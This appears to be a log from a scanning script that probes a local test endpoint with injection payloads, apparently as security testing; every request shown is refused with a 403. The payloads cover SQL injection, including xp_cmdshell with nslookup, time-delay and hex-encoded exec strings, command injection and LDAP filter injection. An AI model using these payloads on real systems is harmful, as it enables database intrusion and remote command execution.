[INFO]00:18:16:376-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or username like '%\n"}}
[INFO]00:18:16:377-caseScan.py:113 >> code: 403
[INFO]00:18:16:377-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:404-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or uname like '%\n"}}
[INFO]00:18:16:405-caseScan.py:113 >> code: 403
[INFO]00:18:16:405-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:432-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or userid like '%\n"}}
[INFO]00:18:16:432-caseScan.py:113 >> code: 403
[INFO]00:18:16:433-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:459-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or uid like '%\n"}}
[INFO]00:18:16:460-caseScan.py:113 >> code: 403
[INFO]00:18:16:460-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:487-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or user like '%\n"}}
[INFO]00:18:16:487-caseScan.py:113 >> code: 403
[INFO]00:18:16:488-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:513-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "exec xp\n"}}
[INFO]00:18:16:514-caseScan.py:113 >> code: 403
[INFO]00:18:16:514-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:539-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "exec sp\n"}}
[INFO]00:18:16:540-caseScan.py:113 >> code: 403
[INFO]00:18:16:541-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:566-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'; exec master..xp_cmdshell\n"}}
[INFO]00:18:16:566-caseScan.py:113 >> code: 403
[INFO]00:18:16:567-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:592-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'; exec xp_regread\n"}}
[INFO]00:18:16:593-caseScan.py:113 >> code: 403
[INFO]00:18:16:593-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:619-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "t'exec master..xp_cmdshell 'nslookup www.google.com'--\n"}}
[INFO]00:18:16:619-caseScan.py:113 >> code: 403
[INFO]00:18:16:620-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:645-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "--sp_password\n"}}
[INFO]00:18:16:646-caseScan.py:113 >> code: 403
[INFO]00:18:16:646-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:672-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\\x27UNION SELECT\n"}}
[INFO]00:18:16:672-caseScan.py:113 >> code: 403
[INFO]00:18:16:673-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:699-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' UNION SELECT\n"}}
[INFO]00:18:16:699-caseScan.py:113 >> code: 403
[INFO]00:18:16:700-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:725-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' UNION ALL SELECT\n"}}
[INFO]00:18:16:726-caseScan.py:113 >> code: 403
[INFO]00:18:16:726-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:751-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or (EXISTS)\n"}}
[INFO]00:18:16:752-caseScan.py:113 >> code: 403
[INFO]00:18:16:752-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:778-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' (select top 1\n"}}
[INFO]00:18:16:778-caseScan.py:113 >> code: 403
[INFO]00:18:16:779-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:804-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'||UTL_HTTP.REQUEST\n"}}
[INFO]00:18:16:804-caseScan.py:113 >> code: 403
[INFO]00:18:16:805-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:830-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "1;SELECT%20*\n"}}
[INFO]00:18:16:831-caseScan.py:113 >> code: 403
[INFO]00:18:16:832-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:858-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "to_timestamp_tz\n"}}
[INFO]00:18:16:859-caseScan.py:113 >> code: 403
[INFO]00:18:16:859-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:885-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "tz_offset\n"}}
[INFO]00:18:16:886-caseScan.py:113 >> code: 403
[INFO]00:18:16:887-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:912-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "&lt;&gt;&quot;'%;)(&amp;+\n"}}
[INFO]00:18:16:913-caseScan.py:113 >> code: 403
[INFO]00:18:16:914-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:939-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'%20or%201=1\n"}}
[INFO]00:18:16:940-caseScan.py:113 >> code: 403
[INFO]00:18:16:940-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:966-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%27%20or%201=1\n"}}
[INFO]00:18:16:967-caseScan.py:113 >> code: 403
[INFO]00:18:16:967-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:16:995-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%20$(sleep%2050)\n"}}
[INFO]00:18:16:996-caseScan.py:113 >> code: 403
[INFO]00:18:16:996-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:022-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%20'sleep%2050'\n"}}
[INFO]00:18:17:022-caseScan.py:113 >> code: 403
[INFO]00:18:17:023-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:048-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "char%4039%41%2b%40SELECT\n"}}
[INFO]00:18:17:049-caseScan.py:113 >> code: 403
[INFO]00:18:17:050-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:075-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "&apos;%20OR\n"}}
[INFO]00:18:17:076-caseScan.py:113 >> code: 403
[INFO]00:18:17:076-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:102-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'sqlattempt1\n"}}
[INFO]00:18:17:103-caseScan.py:113 >> code: 403
[INFO]00:18:17:103-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:127-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "(sqlattempt2)\n"}}
[INFO]00:18:17:128-caseScan.py:113 >> code: 403
[INFO]00:18:17:129-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:154-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "|\n"}}
[INFO]00:18:17:154-caseScan.py:113 >> code: 403
[INFO]00:18:17:155-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:180-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%7C\n"}}
[INFO]00:18:17:180-caseScan.py:113 >> code: 403
[INFO]00:18:17:181-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:206-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "*|\n"}}
[INFO]00:18:17:206-caseScan.py:113 >> code: 403
[INFO]00:18:17:207-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:232-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%2A%7C\n"}}
[INFO]00:18:17:233-caseScan.py:113 >> code: 403
[INFO]00:18:17:233-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:260-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "*(|(mail=*))\n"}}
[INFO]00:18:17:261-caseScan.py:113 >> code: 403
[INFO]00:18:17:261-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:286-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%2A%28%7C%28mail%3D%2A%29%29\n"}}
[INFO]00:18:17:287-caseScan.py:113 >> code: 403
[INFO]00:18:17:287-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:313-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "*(|(objectclass=*))\n"}}
[INFO]00:18:17:314-caseScan.py:113 >> code: 403
[INFO]00:18:17:315-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:341-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%2A%28%7C%28objectclass%3D%2A%29%29\n"}}
[INFO]00:18:17:342-caseScan.py:113 >> code: 403
[INFO]00:18:17:342-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:369-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "(\n"}}
[INFO]00:18:17:370-caseScan.py:113 >> code: 403
[INFO]00:18:17:370-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:395-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%28\n"}}
[INFO]00:18:17:396-caseScan.py:113 >> code: 403
[INFO]00:18:17:397-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:423-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": ")\n"}}
[INFO]00:18:17:423-caseScan.py:113 >> code: 403
[INFO]00:18:17:424-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:449-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%29\n"}}
[INFO]00:18:17:450-caseScan.py:113 >> code: 403
[INFO]00:18:17:450-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:476-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "&\n"}}
[INFO]00:18:17:476-caseScan.py:113 >> code: 403
[INFO]00:18:17:477-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:502-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%26\n"}}
[INFO]00:18:17:503-caseScan.py:113 >> code: 403
[INFO]00:18:17:503-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:528-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "!\n"}}
[INFO]00:18:17:529-caseScan.py:113 >> code: 403
[INFO]00:18:17:529-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:555-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%21\n"}}
[INFO]00:18:17:556-caseScan.py:113 >> code: 403
[INFO]00:18:17:556-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:582-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 1=1 or ''='\n"}}
[INFO]00:18:17:582-caseScan.py:113 >> code: 403
[INFO]00:18:17:583-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:608-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or ''='\n"}}
[INFO]00:18:17:609-caseScan.py:113 >> code: 403
[INFO]00:18:17:609-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:635-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "x' or 1=1 or 'x'='y\n"}}
[INFO]00:18:17:636-caseScan.py:113 >> code: 403
[INFO]00:18:17:636-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:661-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "/\n"}}
[INFO]00:18:17:662-caseScan.py:113 >> code: 403
[INFO]00:18:17:662-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:687-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "//\n"}}
[INFO]00:18:17:688-caseScan.py:113 >> code: 403
[INFO]00:18:17:689-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:715-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "//*\n"}}
[INFO]00:18:17:716-caseScan.py:113 >> code: 403
[INFO]00:18:17:716-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:742-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "*/*\n"}}
[INFO]00:18:17:742-caseScan.py:113 >> code: 403
[INFO]00:18:17:743-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:769-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'\n"}}
[INFO]00:18:17:770-caseScan.py:113 >> code: 403
[INFO]00:18:17:770-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:797-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' and '' like '\n"}}
[INFO]00:18:17:798-caseScan.py:113 >> code: 403
[INFO]00:18:17:799-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:824-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' AnD '' like '\n"}}
[INFO]00:18:17:825-caseScan.py:113 >> code: 403
[INFO]00:18:17:825-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:854-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or '' like '\n"}}
[INFO]00:18:17:855-caseScan.py:113 >> code: 403
[INFO]00:18:17:855-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:883-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' and '' like '%\n"}}
[INFO]00:18:17:883-caseScan.py:113 >> code: 403
[INFO]00:18:17:884-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:910-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' aND '' like '%\n"}}
[INFO]00:18:17:911-caseScan.py:113 >> code: 403
[INFO]00:18:17:911-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:938-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' and '' like ''--\n"}}
[INFO]00:18:17:939-caseScan.py:113 >> code: 403
[INFO]00:18:17:940-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:966-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' and 2>1--\n"}}
[INFO]00:18:17:966-caseScan.py:113 >> code: 403
[INFO]00:18:17:967-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:17:992-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' and 2>3--\n"}}
[INFO]00:18:17:992-caseScan.py:113 >> code: 403
[INFO]00:18:17:993-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:018-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "') and ('x'='x\n"}}
[INFO]00:18:18:018-caseScan.py:113 >> code: 403
[INFO]00:18:18:019-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:044-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": ") and (1=1\n"}}
[INFO]00:18:18:044-caseScan.py:113 >> code: 403
[INFO]00:18:18:045-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:071-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'or''='\n"}}
[INFO]00:18:18:071-caseScan.py:113 >> code: 403
[INFO]00:18:18:072-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:098-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'or'='or'\n"}}
[INFO]00:18:18:098-caseScan.py:113 >> code: 403
[INFO]00:18:18:099-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:133-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "a' or 1=1--\n"}}
[INFO]00:18:18:134-caseScan.py:113 >> code: 403
[INFO]00:18:18:136-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:179-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\"a\"\" or 1=1--\"\n"}}
[INFO]00:18:18:180-caseScan.py:113 >> code: 403
[INFO]00:18:18:181-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:223-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": " or a = a\n"}}
[INFO]00:18:18:224-caseScan.py:113 >> code: 403
[INFO]00:18:18:225-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:285-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "a' or 'a' = 'a\n"}}
[INFO]00:18:18:286-caseScan.py:113 >> code: 403
[INFO]00:18:18:287-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:326-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "1 or 1=1\n"}}
[INFO]00:18:18:326-caseScan.py:113 >> code: 403
[INFO]00:18:18:327-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:354-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "a' waitfor delay '0:0:10'--\n"}}
[INFO]00:18:18:354-caseScan.py:113 >> code: 403
[INFO]00:18:18:355-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:381-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "1 waitfor delay '0:0:10'--\n"}}
[INFO]00:18:18:382-caseScan.py:113 >> code: 403
[INFO]00:18:18:383-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:408-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)\n"}}
[INFO]00:18:18:409-caseScan.py:113 >> code: 403
[INFO]00:18:18:409-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:444-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) \n"}}
[INFO]00:18:18:445-caseScan.py:113 >> code: 403
[INFO]00:18:18:447-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:505-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)\n"}}
[INFO]00:18:18:506-caseScan.py:113 >> code: 403
[INFO]00:18:18:507-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:535-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)\n"}}
[INFO]00:18:18:536-caseScan.py:113 >> code: 403
[INFO]00:18:18:537-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:562-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "a'\n"}}
[INFO]00:18:18:563-caseScan.py:113 >> code: 403
[INFO]00:18:18:564-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:589-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "?\n"}}
[INFO]00:18:18:590-caseScan.py:113 >> code: 403
[INFO]00:18:18:590-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:616-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 1=1\n"}}
[INFO]00:18:18:616-caseScan.py:113 >> code: 403
[INFO]00:18:18:617-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:642-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\u2018 or 1=1 --\n"}}
[INFO]00:18:18:642-caseScan.py:113 >> code: 403
[INFO]00:18:18:643-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:668-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "x' AND userid IS NULL; --\n"}}
[INFO]00:18:18:668-caseScan.py:113 >> code: 403
[INFO]00:18:18:669-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:694-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "x' AND email IS NULL; --\n"}}
[INFO]00:18:18:694-caseScan.py:113 >> code: 403
[INFO]00:18:18:695-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:18:720-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "anything' OR 'x'='x\n"}}
[INFO]00:18:18:720-caseScan.py:113 >> code: 403
[INFO]00:18:18:721-caseScan.py:114 >> response: {
